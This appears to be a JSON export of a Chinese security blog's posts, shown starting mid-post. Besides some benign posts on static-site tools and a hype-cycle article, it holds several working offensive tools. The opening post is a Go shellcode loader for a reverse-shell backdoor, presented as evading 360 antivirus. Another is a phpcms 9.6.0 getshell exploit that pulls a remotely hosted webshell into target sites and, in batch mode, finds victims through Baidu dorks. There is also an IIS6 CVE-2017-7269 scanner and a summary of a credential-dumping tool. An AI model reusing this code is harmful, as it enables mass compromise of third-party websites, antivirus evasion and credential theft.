\"\\x6c\\x0c\\xc8\\xf5\\x59\\xd7\\x45\\x36\\x85\\x99\\x8d\\x34\\x65\"\n    buf += \"\\x21\\xd3\\x3b\\x35\\xce\\x22\\x29\\x0c\\x4e\\xca\\x48\\x3f\\x55\"\n    buf += \"\\x5d\\x1b\\xda\\x35\\xc1\\x2d\"\n    // at your call site, you can send the shellcode directly to the C\n    // function by converting it to a pointer of the correct type.\n    shellcode := []byte(buf)\n    C.call((*C.char)(unsafe.Pointer(\u0026shellcode[0])))\n}\n```\n以上就是全部代码\n其实Golang还有个执行shellcode的方法是不用内联C语言的，但是我这边测试能接到反弹shell，但是执行命令会直接断开，代码我也贴出来\n```Golang\npackage main\n\nimport (\n    \"syscall\"\n    \"unsafe\"\n)\n\nfunc ThreadExecute(Shellcode []byte) {\n    var K32 = syscall.MustLoadDLL(\"kernel32.dll\")\n    var CreateThread = K32.MustFindProc(\"CreateThread\")\n    var VirtualAlloc = K32.MustFindProc(\"VirtualAlloc\")\n    var WaitForSingleObject = K32.MustFindProc(\"WaitForSingleObject\")\n\n    Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n    AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))\n\n    for i := 0; i \u003c len(Shellcode); i++ {\n        AddrPtr[i] = Shellcode[i]\n    }\n\n    ThreadAddr, _, _ := CreateThread.Call(0, 0, Addr, 0, 0, 0)\n    WaitForSingleObject.Call(ThreadAddr, 0xFFFFFFFF)\n}\n```\n关于断开的原因，希望找出原因的能告知我一下，其实我们会发现，内联C是比较简单的\n\n## 杀毒测试\n在代码所在目录cmd执行`go build`得到二进制文件（或者可以用`go build -ldflags=\"-s -w\"`减小体积，`go build -ldflags=\"-H windowsgui -s -w\"`去掉命令窗口）\n![](https://ooo.0o0.ooo/2017/04/20/58f840f0e9a00.png)\n![](https://ooo.0o0.ooo/2017/04/20/58f840f8a704c.png)\n\n可以看到360的静态查杀和动态查杀都没有发现\n那么是否正常工作呢\n![](https://ooo.0o0.ooo/2017/04/20/58f840f6d4862.png)\n\n可以看到完全是没问题的，体积比python编译出来的小的多，编译出来是500多kb，然后经过upx压缩了一下（测试upx压缩后功能依旧正常），降低到了200多kb\n![](https://ooo.0o0.ooo/2017/04/20/58f840dbdc23f.png)\n\n## 视频\n{% bilibili 9975200 %}\n","cover":"","link":"2017/04/20/msf-antivirus.html","preview":"\u003cp\u003emsf是一个很强大的工具，我经常会在渗透用它来反弹shell，不过它生成的反弹后门会被不少杀软kill，这篇文章只是讲讲我在msf中一个简单的免杀小技巧\u003c/p\u003e\n","title":"关于msf反弹后门的免杀Tips"},{"content":"\n\n\n虽说我的网盘（exm，也许页面确实丑了点，不过页面生成的样式你自己可以改）美工已经被乱刀砍死，但是还是有小伙伴问我是怎么搭建的\n\n## 关于搭建\n这个真没什么好说的，vps我只安装了nginx，然后配置域名指向到我的同步目录，然后用其他工具同步上去就行了（关于问自己手动同步麻烦的，其实并不麻烦，有很多好用的软件，本人用的Resilio Sync）\n\n## 关于页面的生成\n### 第一阶段\n那时候只有两三个文件，html页面是我手写的手动增加的\n\n### 第二阶段\n此时已经有了一个子目录，文件开始增多，我开始考虑写个简单的先用着，Python的写了，不过速度感觉有点不如意（原谅我的吹毛求疵）,并且有个麻烦事是每次重装系统后需要安装Python，然后我选用了Golang，时间仓促写了一个单页面生成，不进行目录深度遍历的，也就是说我每次新开一个目录需要把这个程序拷贝到当目录下双击生成html\n\n### 第三阶段\n文件夹和文件日益增多，上面的方式我已经感觉到特别繁琐了，需要找个机会把代码重构一下，使他更加优化\n然后我开始着手写第二版，这个版本我没保留，具体功能就是对上一个版本做了一点改进，使它支持了深度遍历\n但是自从**T00ls灵车漂移事件以来，官方管理员给*GetWriter*老哥（如果谁认识希望告知，希望能致个歉）的一纸封书将此事推上风口浪尖，作为始作俑者，我网站首当其冲，遭受了大量老哥多来自夜间的洗礼（说实话，希望高抬贵手，流量快没了）**，这件事情持续发酵了两三天，我一直在思考，如何为老哥们带来更良好的观感体验，于是我觉得应该要让这个页面生成器对前端展示的修改更加方便，无须从代码入手，开始了第三版的编写\n\n#### 暂时实现的功能\n- 支持模板\n- 加入了配置文件（其实也是模板）\n- 加入了noView.txt规则（具体表现为这个txt中的文件名将不参与生成html页面）\n可能以后会抽时间再进行优化，这个时间不定，看哪天自己的需求更高了\n\n\n## 更新记录在下面，更新后的代码就不贴了，**之前的代码我就在这个页面上删了**，自己感兴趣可以上github查看\n\n## 至于前端\n~~你们别想了，前端之魂在我体内没存在过，哪天兴致来了可能会看看相关知识，这个丑页面就丑着凑合看吧，如果有能力可以进行二次修改~~\n\n**为它搞了一套css与文件类型图标**（关于style.css文件，是需要你放到远端在线调用的，你可以上传到七牛，或者你同步的时候放到网站根目录下，然后通过域名+/style.css的方式来调用）\n\n## 更新记录\n- 对一部分冗余的进行了优化，提升了一丁点效率\n- 可以放到环境变量path了，不需要放到本目录里了，只需要在本目录调用就可以（当然），按照之前的方法也是可以的\n---------------\n- 对文件li列表做了排序，优先级为后缀名-\u003e文件名\n- 对li列表加了css类，可以自定义li的css了，具体见生成后的文件\n- 为页面生成器搞了一套css，为类型加上了图标，具体效果见下图\n![snipaste_20170414_235335.png](https://ooo.0o0.ooo/2017/04/14/58f0f09499fda.png)\n\n## 下载地址\n这次不能给抓住机会了，放github吧\n- [代码下载地址](https://github.com/akkuman/generateIndexHTML)\n- [二进制文件下载地址](https://github.com/akkuman/generateIndexHTML/bin)\n","cover":"","link":"2017/04/13/my-yun-generatehtml-with-golang.html","preview":"\u003cp\u003e虽说我的网盘（exm，也许页面确实丑了点，不过页面生成的样式你自己可以改）美工已经被乱刀砍死，但是还是有小伙伴问我是怎么搭建的\u003c/p\u003e\n\n\u003ch2\u003e关于搭建\u003c/h2\u003e\n\n\u003cp\u003e这个真没什么好说的，vps我只安装了nginx，然后配置域名指向到我的同步目录，然后用其他工具同步上去就行了（关于问自己手动同步麻烦的，其实并不麻烦，有很多好用的软件，本人用的Resilio Sync）\u003c/p\u003e\n","title":"自己网盘的页面生成器(私用公开-Golang)"},{"content":"\n\n\n## 代码\n```python\ndef parseBaidu(keyword, pagenum):\n    keywordsBaseURL = 'https://www.baidu.com/s?wd=' + str(quote(keyword)) + '\u0026oq=' + str(quote(keyword)) + '\u0026ie=utf-8' + '\u0026pn='\n    pnum = 0\n    while pnum \u003c= int(pagenum):\n        baseURL = keywordsBaseURL + str(pnum*10)\n        try:\n            request = requests.get(baseURL, headers=headers)\n            soup = BeautifulSoup(request.text, \"html.parser\")\n            for a in soup.select('div.c-container \u003e h3 \u003e a'):\n                url = requests.get(a['href'], headers=headers).url\n                yield url\n        except:\n            yield None\n        finally:\n            pnum += 1\n```\n\n## 示例用法\n```python\nimport requests\nfrom bs4 import BeautifulSoup\n\nheaders = {\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\"\n}\n\ndef parseBaidu(keyword, pagenum)\n\ndef main():\n    for url in parseBaidu(\"keyword\",10):\n        if url:\n            print(url)\n        else:\n            continue\n```\n","cover":"","link":"2017/04/11/baidusearch-get-realurl-with-python.html","preview":"\u003ch2\u003e代码\u003c/h2\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003edef parseBaidu(keyword, pagenum):\n    keywordsBaseURL = 'https://www.baidu.com/s?wd=' + str(quote(keyword)) + '\u0026amp;oq=' + str(quote(keyword)) + '\u0026amp;ie=utf-8' + '\u0026amp;pn='\n    pnum = 0\n    while pnum \u0026lt;= int(pagenum):\n        baseURL = keywordsBaseURL + str(pnum*10)\n        try:\n            request = requests.get(baseURL, headers=headers)\n            soup = BeautifulSoup(request.text, \u0026quot;html.parser\u0026quot;)\n            for a in soup.select('div.c-container \u0026gt; h3 \u0026gt; a'):\n                url = requests.get(a['href'], headers=headers).url\n                yield url\n        except:\n            yield None\n        finally:\n            pnum += 1\n\u003c/code\u003e\u003c/pre\u003e\n","title":"百度搜索引擎取真实地址-python代码"},{"content":"\n\n\n\n## 介绍\n- 一键化`python 1.py http://xxx.com`,如果是批量直接运行py文件即可\n\n## 待办\n- [] 加入对有验证码phpcms网站的支持\n- [] 加入批量(**已完成**)\n\n\n\n## 说明\n依赖库的安装`pip install requests`\n\n## 代码\n```python\n# -*- coding:utf-8 -*-\n\n'''\n----------------------\nAuthor : Akkuman\nBlog   : hacktech.cn\n----------------------\n'''\n\nimport requests\nimport sys\nfrom random import Random\n\nchars = 'qwertyuiopasdfghjklzxcvbnm0123456789'\n\ndef main():\n    if len(sys.argv) \u003c 2:\n        print(\"[*]Usage   : Python 1.py http://xxx.com\")\n        sys.exit()\n    host = sys.argv[1]\n    url = host + \"/index.php?m=member\u0026c=index\u0026a=register\u0026siteid=1\"\n\n    data = {\n        \"siteid\": \"1\",\n        \"modelid\": \"1\",\n        \"username\": \"dsakkfaffdssdudi\",\n        \"password\": \"123456\",\n        \"email\": \"dsakkfddsjdi@qq.com\",\n        # 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0\n        \"info[content]\": \"\u003cimg src=http://file.codecat.one/normalOneWord.txt?.php#.jpg\u003e\",\n        \"dosubmit\": \"1\",\n        \"protocol\": \"\",\n    }\n    try:\n        rand_name = chars[Random().randint(0, len(chars) - 1)]\n        data[\"username\"] = \"akkuman_%s\" % rand_name\n        data[\"email\"] = \"akkuman_%s@qq.com\" % rand_name\n        \n        htmlContent = requests.post(url, data=data)\n\n        successUrl = \"\"\n        if \"MySQL Error\" in htmlContent.text and \"http\" in htmlContent.text:\n            successUrl = htmlContent.text[htmlContent.text.index(\"http\"):htmlContent.text.index(\".php\")] + \".php\"\n            print(\"[*]Shell  : %s\" % successUrl)\n        if successUrl == \"\":\n            print(\"[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\\n\")\n\n    except:\n        print(\"Request Error\")\n\n\nif __name__ == '__main__':\n    main()\n```\n\n## 批量\n```python\n# -*- coding:utf-8 -*-\n\n'''\n----------------------\nAuthor : Akkuman\nBlog   : hacktech.cn\n----------------------\n'''\n\nimport requests\nfrom bs4 import BeautifulSoup\n# from urlparse import unquote //Python2\n# from urlparse import urlparse //Python2\nfrom urllib.parse import quote\nfrom urllib.parse import urlparse\nfrom random import Random\n\nchars = 'qwertyuiopasdfghjklzxcvbnm0123456789'\n\nheaders = {\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\"\n}\n\ndef parseBaidu(keyword, pagenum):\n    keywordsBaseURL = 'https://www.baidu.com/s?wd=' + str(quote(keyword)) + '\u0026oq=' + str(quote(keyword)) + '\u0026ie=utf-8' + '\u0026pn='\n    pnum = 0\n    while pnum \u003c= int(pagenum):\n        baseURL = keywordsBaseURL + str(pnum*10)\n        try:\n            request = requests.get(baseURL, headers=headers)\n            soup = BeautifulSoup(request.text, \"html.parser\")\n            for a in soup.select('div.c-container \u003e h3 \u003e a'):\n                url = requests.get(a['href'], headers=headers).url\n                yield url\n        except:\n            yield None\n        finally:\n            pnum += 1\n\n\ndef saveShell(shellUrl):\n    with open(\"webShell.txt\",\"a+\") as f:\n        f.write(\"[*]%s\\n\" % shellUrl)\n\ndef main():\n    data = {\n        \"siteid\": \"1\",\n        \"modelid\": \"1\",\n        \"username\": \"akkumandsad\",\n        \"password\": \"123456\",\n        \"email\": \"akkakkumafa@qq.com\",\n        # 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0,普通一句话http://file.codecat.one/normalOneWord.txt\n        \"info[content]\": \"\u003cimg src=http://7xusrl.com1.z0.glb.clouddn.com/bypassdog.txt?.php#.jpg\u003e\",\n        \"dosubmit\": \"1\",\n        \"protocol\": \"\",\n    }\n    for crawlUrl in parseBaidu(\"inurl:index.php?m=member\u0026c=index\u0026a=register\u0026siteid=1\", 10):\n        try:\n            if crawlUrl:\n                rand_name = chars[Random().randint(0, len(chars) - 1)]\n                data[\"username\"] = \"akkuman_%s\" % rand_name\n                data[\"email\"] = \"akkuman_%s@qq.com\" % rand_name\n                host = urlparse(crawlUrl).scheme + \"://\" + urlparse(crawlUrl).hostname\n                url = host + \"/index.php?m=member\u0026c=index\u0026a=register\u0026siteid=1\"\n                htmlContent = requests.post(url, data=data, timeout=10)\n                successUrl = \"\"\n                if \"MySQL Error\" in htmlContent.text and \"http\" in htmlContent.text:\n                    successUrl = htmlContent.text[htmlContent.text.index(\"http\"):htmlContent.text.index(\".php\")] + \".php\"\n                    print(\"[*]Shell  : %s\" % successUrl)\n                    saveShell(successUrl)\n                if successUrl == \"\":\n                    print(\"[x]Failed : Failed to getshell.\")\n            else:\n                continue\n        except:\n            print(\"Request Error\")\n\n\n\nif __name__ == '__main__':\n    main()\n```\n\n## 测试图\n### 单个\n![TIM图片20170410191951.png](https://ooo.0o0.ooo/2017/04/10/58eb6a69d5676.png)\n### 批量\n![TIM图片20170410225257.png](https://ooo.0o0.ooo/2017/04/11/58ec642d6578f.png)\n\n## 下载地址\n[代码下载地址](http://file.codecat.one/phpcms/)\n","cover":"","link":"2017/04/10/phpcms9-6-0-getshell-with-python.html","preview":"\u003ch2\u003e介绍\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e一键化\u003ccode\u003epython 1.py http://xxx.com\u003c/code\u003e,如果是批量直接运行py文件即可\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2\u003e待办\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e[] 加入对有验证码phpcms网站的支持\u003c/li\u003e\n\u003cli\u003e[] 加入批量(\u003cstrong\u003e已完成\u003c/strong\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n","title":"phpcms9-6-0 一键getshell工具"},{"content":"\n\n\n**[Github项目地址](https://github.com/huntergregal/mimipenguin)**\n\n前有Mimikatz，今有mimipenguin，近日国外安全研究员huntergregal发布了工具mimipenguin，一款Linux下的密码抓取神器，可以说弥补了Linux下密码抓取的空缺。\n编写思路来自流行的[windows密码抓取神器mimikatz](https://github.com/gentilkiwi/mimikatz)\n\n![](https://ooo.0o0.ooo/2017/04/06/58e5a6e8ac47f.png)\n\n## 详情\n通过转储过程和提取那些包含明文密码可能性很高的行（hang），充分利用内存中的明文凭证。通过检查/etc/shadow文件hash,内存中的hash和正则匹配去尝试计算出每个单词的概率\n\n## 要求\n- root权限\n\n## 已支持(以下环境已通过测试)\n- Kali 4.3.0 (rolling) x64 (gdm3)\n- Ubuntu Desktop 12.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)\n- Ubuntu Desktop 16.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)\n- XUbuntu Desktop 16.04 x64 (Gnome Keyring 3.18.3-0ubuntu2)\n- VSFTPd 3.0.3-8+b1 (Active FTP client connections)\n- Apache2 2.4.25-3 (Active/Old HTTP BASIC AUTH Sessions) [Gcore dependency]\n- openssh-server 1:7.3p1-1 (Active SSH connections - sudo usage)\n\n## 记录\n- 在内存中的密码 - 100%有效\n- 计划扩大支持和其他凭证位置\n- 努力扩展到非桌面环境\n- 已知bug - 有时gcore会挂起脚本，不过这是gcore导致的问题\n- 开放提出请求和社区研究\n- 计划未来的LDAP研究（nscld winbind等）\n\n## 联系方式\n- Twitter: [@huntergregal](https://twitter.com/HunterGregal)\n- 个人站点: [huntergregal.com](http://huntergregal.com/)\n- Github: [huntergregal](https://github.com/huntergregal)\n\n## 特别鸣谢\n- the-useless-one for remove Gcore as a dependency, cleaning up tabs, and adding output option\n- gentilkiki for Mimikatz, the inspiration and the twitter shoutout\n- pugilist for cleaning up PID extraction and testing\n- ianmiell for cleaning up some of my messy code\n- w0rm for identifying printf error when special chars are involved\n- benichmt1 for identifying multiple authenticate users issue\n- ChaitanyaHaritash for identifying special char edge case issues\n\n转载自[mimipenguin](https://github.com/huntergregal/mimipenguin/blob/master/README.md)\n","cover":"","link":"2017/04/02/mimipenguin.html","preview":"\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/huntergregal/mimipenguin\"\u003eGithub项目地址\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e前有Mimikatz，今有mimipenguin，近日国外安全研究员huntergregal发布了工具mimipenguin，一款Linux下的密码抓取神器，可以说弥补了Linux下密码抓取的空缺。\n编写思路来自流行的\u003ca href=\"https://github.com/gentilkiwi/mimikatz\"\u003ewindows密码抓取神器mimikatz\u003c/a\u003e\u003c/p\u003e\n","title":"抓取当前登录用户登录密码的工具：mimipenguin"},{"content":"\n\n\n## 简介\nWDTP（山湖录）不止是一款开源免费的GUI桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、录音、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验的Markdown文本编辑器和一款方便强大的录音机。本软件研发的核心思想是：**简洁高效、轻灵优雅、先进强悍、操作简单**。\n\n\n\n![](http://underwaysoft.com/works/wdtp/media/wdtp-main.jpg)\n\nWDTP（山湖录）可运行于macOS和Windows系统下，旨在提高这两大平台下所有写作/分享者的生产力及生产效率，节约耗时，减少无谓的智能、体力与资源消耗。它适合于以下群体：\n\n- 以**文字、声音、图片、视频为主要内容**的写作/记录/创作/分享者\n- 职业或业余作家、小说家、编剧、技术类图书的作者及编撰者\n- 经常记笔记或写点东西的人\n- 写作极客\n- 打算采用静态页面的个人博客\n- 打算采用静态页面的中小企业\nWDTP的全名是：**Walden Tips**，中文名称：**山湖录**，UnderwaySoft开发出品。设计、编程及维护：SwingCoder。立项日期：2016年8月2日，第一个内测版发布日期：2017年2月3日。\n\n## 核心功能\n+ 创作。对职业作家（特别是技术作家以及需要大量构思与情节编排的文艺作家）来说比Pages、Word等WYSWYG类型的桌面文字软件更加高效、简洁和灵活的内容创作、章节管理与格式化排版工具。可方便地实现多章节（情节、场景、概念、故事主线等）并发创作/编辑、任意调序、随意归类等强大功能，完稿后一键即可成书。\n+ 笔记。可随时记录并管理学习笔记、读书笔记以及有一定篇幅并打算结构化保存、管理、检视和封装的零星随记、杂感等等。可定期将所有或任意分类（目录）下的笔记“装订成册”、集中输出，一键即可完成。\n+ 建站。强大而新颖的静态网站维护、编辑、生成、代码调试与内容、结构管理系统。特别适合追求全站真正静态化、内容至上的个人博客与中小企业官网。\n+ Markdown编辑器。在保留并规范了大部分“正统”Markdown语法的基础上，WDTP根据大多数作者/作家的实际需求，增加了一批非常实用的新文本标记语法。比如：插入图注和表注、居中、靠右、多种类型的表格、图文混排、插入音视频媒体文件、内容注释、跨文档扩展标记等等。该编辑器针对Windows系统和macOS系统（非Retina显示屏）对中文字体的渲染结果不尽人意等情况专门做了特殊优化与调整，使用户在输入、编辑时可获得更良好的体验。\n+ 以上几项，不仅可以文字输入，更可以语音输入，直接记录声音。这一点对不擅长文字表达的朋友或者记者、演员、各类主持人、音乐家、演奏家等群体来说非常方便。\n+ WDTP还有极具实用价值的“复习/提醒”功能，文档隐身功能，文档缩略语功能和极其强悍的“智库”架构。\n其他更多……\n\n在“笔记、写书、建站/博客、前端开发”这几个方面，WDTP（山湖录）无缝集成，一键切换。即：同一套内容，随时可生成上述任何一种类型，还可多种类型混合使用。\n\n**程序采用c++语言编写，作者同时也是我十分敬重的一位程序员，如果想查看更多信息请访问他的[项目主页](http://underwaysoft.com/works/wdtp/index.html)程序开源[github地址](https://github.com/LegendRhine/WDTP)**\n\n## 上手使用\n本来想说更多的，但是确实这款软件和其他的静态博客生成器不一样，拥有着方便的界面，支持english和中文，设置里面即可切换，相信只要你使用过，你就会使用它，能感受到他的方便快捷，如果想看更多玩法和说明请查看[项目主页](http://underwaysoft.com/works/wdtp/index.html)，现在只支持两种模板book(用来作为笔记)和blog(用来生成静态博客)，不过作者说会逐渐增加主题，真的除了暂时主题匮乏之外(会前端的可以自己改改主题)，其他的功能相比于其他的静态博客生成器方便得不是一丁半点\n\n**那么生成静态文件之后如何上传到自己的vps或者github pages或者coding pages呢？**\n### 上传到vps\n这个你可以使用常规的FTP或者Rsync或者其他方法上传，不过我推荐自己的做法(使用Resilio Sync)\n如果你的服务器是windows那么你只需要去[Resilio Sync官网](https://www.resilio.com/individuals/)下载，建议安装为服务，然后访问本机sync服务的网址，点击右上角添加文件夹添加你的网站根目录，然后复制读写key，本机安装Resilio sync客户端然后手动连接这个key到你的静态文件目录，具体可以查资料，这个不难\n如果你的服务器是Linux，可以查看Resilio Sync网站上面的[How to install Sync Package on Linux](https://help.getsync.com/hc/en-us/articles/206178924)，说明比较详细，安装好之后和上面的步骤一样，然后只要你本机挂着resilio sync软件，生成就可以即时同步。\ntrust me， 你将找到这个软件(Resilio Sync)更多的玩法，这软件之前的名字是btsync\n当然，这只是我自己使用的方法，你也可以使用其他方法\n至于上传到github pages或者coding pages，这个你需要会用git，进入静态文件目录，然后bash下执行\n```bash\ngit init\ngit add .\ngit commit //命令给文件一个仓库标记，做为仓库历史，便于以后在远程端查找\ngit remote add origin git@github.com:username/username.github.io.git\n```\ngit@github.com:username/username.github.io.git的是你的git远端地址，至于为什么用这个是因为ssh创建公钥之后不用重复输入密码\n**注: **[如何生成ssh公钥](https://coding.net/help/doc/account/ssh-key.html)这篇文章是以coding.net为例，不过你生成的id_rsa.pub内容同时也可以添加到github，基本相同的步骤，如果有什么疑问可以百度一下关键词为`github ssh公钥 配置`\n\n### 添加评论功能\n- 如果你不愿意麻烦可以使用邮箱来收集评论\n打开qq邮箱点击上方**设置-\u003e账户-\u003e邮我-\u003e使用邮我**\n然后获取代码\n![snipaste_20170401_200420.png](https://ooo.0o0.ooo/2017/04/01/58df97595ea80.png)\n复制`\u003ca target=\"_blank\" href=\"http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme\u0026email=64qAgJ6GioWYq5qaxYiEhg\" style=\"text-decoration:none;\"\u003e`\n然后打开你的项目文件夹/themes/blog/article.html，把相应的地方改为下面例子这样\n```html\n\u003cdiv class=page_navi align=\"center\"\u003e\n    \u003cb\u003e\u003ca target=\"_blank\" href=\"http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme\u0026email=64qAgJ6GioWYq5qaxYiEhg\" style=\"text-decoration:none;\"\u003e评论/咨询/讨论/留言\u003c/a\u003e\u003c/b\u003e\n\u003c/div\u003e\n```\n然后别人点击评论就可以打开给你发邮件的入口\n\n- 如果你想添加社会化评论系统\n鉴于多说即将关闭，国内没被墙的无需北岸的第三方评论已经很少了，这里我用[来必力](https://livere.com)做例子\n1. 注册登录(如果chrome浏览器注册之后一直登录不了请使用火狐)\n2. 点击顶栏安装，然后填好相关信息获取代码\n![snipaste_20170401_201601.png](https://ooo.0o0.ooo/2017/04/01/58df9a0fc3eb5.png)\n3. 然后打开你的项目文件夹/themes/blog/article.html，把原先的评论代码删除掉，在合适的地方插入上方代码，我插入完之后的article.html例子如下\n```html\n\u003c!doctype html\u003e\n\u003chtml lang=\"en\"\u003e\n \u003chead\u003e\n  \u003cmeta charset=\"UTF-8\"\u003e\n  \u003cmeta name=\"Generator\" content=\"WDTP by UnderwaySoft\"\u003e\n  \u003cmeta name=\"Author\" content=\"{{author}}\"\u003e\n  \u003cmeta name=\"Keywords\" content=\"{{keywords}}\"\u003e\n  \u003cmeta name=\"Description\" content=\"{{description}}\"\u003e\n  \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"{{siteRelativeRootPath}}add-in/style.css\"/\u003e\n  \u003ctitle\u003e{{title}}\u003c/title\u003e\n \u003c/head\u003e\n \u003cbody\u003e\n  \u003cp\u003e \n  {{siteLogo}}\n  {{siteMenu}}\n  \u003chr\u003e\n  {{siteNavi}}\n  {{content}}\n  \u003chr\u003e\n  {{createAndModifyTime}}\n\n    \u003cdiv align=center\u003e\u003ch5\u003e\u003cp style=\"background:PowderBlue\"\u003e\n\t    本文版权：{{siteLink}} \u0026emsp;\n\t\t共享协议：\u003ca href='http://creativecommons.org/licenses/by-nc-nd/2.5/deed.zh' target='_blank'\u003e署名-非商业使用-禁止演绎\u003c/a\u003e\u003c/h5\u003e\n    \u003c/div\u003e\n\n  \u003chr\u003e\n  {{previousAndNext}}\n\n  {{ad}}\n  \u003cp\u003e\n  {{random}}\n  \u003chr\u003e\n\t\u003c!-- 来必力City版安装代码 --\u003e\n\t\u003cdiv id=\"lv-container\" data-id=\"city\" data-uid=\"MTAyMC8yODAwMC80NTc3\"\u003e\n\t\t\u003cscript type=\"text/javascript\"\u003e\n\t\t\t(function(d, s) {\n\t\t\t\tvar j, e = d.getElementsByTagName(s)[0];\n\n\t\t\t\tif (typeof LivereTower === 'function') { return; }\n\n\t\t\t\tj = d.createElement(s);\n\t\t\t\tj.src = 'https://cdn-city.livere.com/js/embed.dist.js';\n\t\t\t\tj.async = true;\n\n\t\t\t\te.parentNode.insertBefore(j, e);\n\t\t\t})(document, 'script');\n\t\t\u003c/script\u003e\n\t\u003cnoscript\u003e 为正常使用来必力评论功能请激活JavaScript\u003c/noscript\u003e\n\t\u003c/div\u003e\n\t\u003c!-- City版安装代码已完成 --\u003e\n  {{contact}}\n  {{bottomCopyright}}\n\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n4. 最后的效果如图\n![snipaste_20170401_201926.png](https://ooo.0o0.ooo/2017/04/01/58df9adb69d5f.png)\n\n### 最后要说的\n这个工具确实是十分方便的，如果你作为笔记，可以使用坚果云来同步，同时它可以打包你的数据，多说无益，试用之后你会感受到它的强大\n\n\n\n**本文部分转自[Underwaysoft](http://underwaysoft.com/works/wdtp/download.html)**\n","cover":"","link":"2017/04/01/walden-tips-introdution.html","preview":"\u003ch2\u003e简介\u003c/h2\u003e\n\n\u003cp\u003eWDTP（山湖录）不止是一款开源免费的GUI桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、录音、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验的Markdown文本编辑器和一款方便强大的录音机。本软件研发的核心思想是：\u003cstrong\u003e简洁高效、轻灵优雅、先进强悍、操作简单\u003c/strong\u003e。\u003c/p\u003e\n","title":"推荐一个静态博客兼笔记的工具：WDTP"},{"content":"\n\n\n\n[代码地址](https://gist.githubusercontent.com/iam1980/62ee37e38c7f76ca5d3889379e1d81fd/raw/aed9a3ef42bc6e6592913c5df8906ca6c57c9c66/getpro.py)\n\n\n\n```python\nimport subprocess\n\nf = open('ips.txt', 'r')\nflines = f.readlines()\n\nvulnsrvs = 0\ni = 1\n\nfor line in flines:\n\n    host = line.split(\":\")\n\n    ip = host[0].replace('\\n','')\n    port = host[1].replace('\\n','')\n\n    print \"Try (\" + str(i) +\") \"+ str(ip) +\":\" + str(port)\n\n    if port == \"443\":\n        #dont bother with SSL/TLS\n        continue\n    try:\n        myout =  subprocess.check_output(['curl', '--connect-timeout', '2', '--max-time', '2', '-s','-I', '-X', 'PROPFIND','http://' + ip  + ':' + port + '/' ])\n        print myout\n        if \"HTTP/1.1 411 Length Required\" in myout:\n            print \"Found one:\"\n            print myout\n            vulnsrvs += 1\n    except Exception, e:\n        print str(e.output)\n    i += 1\n    print \"Vulnerable: \" + str(vulnsrvs)\n```\n\n## 说明\nips.txt 是待验证的列表格式为：\n```\n129.112.44.1:80\n129.112.44.2:81\n129.112.44.43:8808\n```\n它不检测443端口（HTTPS）\n你也可以简单改一下进行网段批量验证。\n\n转自群友[CF_HB](http://www.loner.fm/article.php?id=24251)\n","cover":"","link":"2017/04/01/iis6-0-cve-2017-7269.html","preview":"\u003cp\u003e\u003ca href=\"https://gist.githubusercontent.com/iam1980/62ee37e38c7f76ca5d3889379e1d81fd/raw/aed9a3ef42bc6e6592913c5df8906ca6c57c9c66/getpro.py\"\u003e代码地址\u003c/a\u003e\u003c/p\u003e\n","title":"iis6-0 cve-2017-7269 批量验证脚本"},{"content":"\n\n\n\n推荐一个十分好看的开源博客系统，直接百度“里程密”地址[www.lcm.wang](http://www.lcm.wang/)\n\n附图\n\n主页\n\n![snipaste_20170312_202041.png](https://ooo.0o0.ooo/2017/03/12/58c53df6b41cf.png)\n\n后台\n\n![snipaste_20170312_201924.png](https://ooo.0o0.ooo/2017/03/12/58c53e0b65eaa.png)\n\n浓浓的科技简约风，适合做技术的你\n","cover":"","link":"2017/03/12/a-beautiful-open-source-blog-lcm.html","preview":"","title":"推荐一个十分好看的开源博客系统"},{"content":"\n\n\n全球最大的 IT 咨询公司[高德纳](http://baike.baidu.com/item/Gartner)（Gartner），有一个\"[技术热门度曲线](http://www.gartner.com/technology/research/methodologies/hype-cycle.jsp)\"模型（Gartner Hype Cycle）。\n\n该模型认为，一门技术的发展要经历五个阶段。\n\n![bg2017030301.png](https://ooo.0o0.ooo/2017/03/12/58c4de8267e76.png)\n\n\n1. **启动期（Innovation Trigger）**\n该技术刚刚诞生，还只是一个概念，不具有可用性，无法评估商业潜力。媒体有所报道，引起了外界的兴趣。\n\n2. **泡沫期（Peak of Inflated Expectations）**\n该技术逐步成型，出现了个别成功的案例，一些激进的公司开始跟进。媒体开始大肆报导，伴有各种非理性的渲染，产品的知名度达到高峰。\n\n3. **低谷期（Trough of Disillusionment）**\n该技术的局限和缺点逐步暴露，对它的兴趣开始减弱。基于它的产品，大部分被市场淘汰或者失败，只有那些找到早期用户的公司艰难地活了下来。媒体对它的报道逐步冷却，前景不明。\n\n4. **爬升期（Slope of 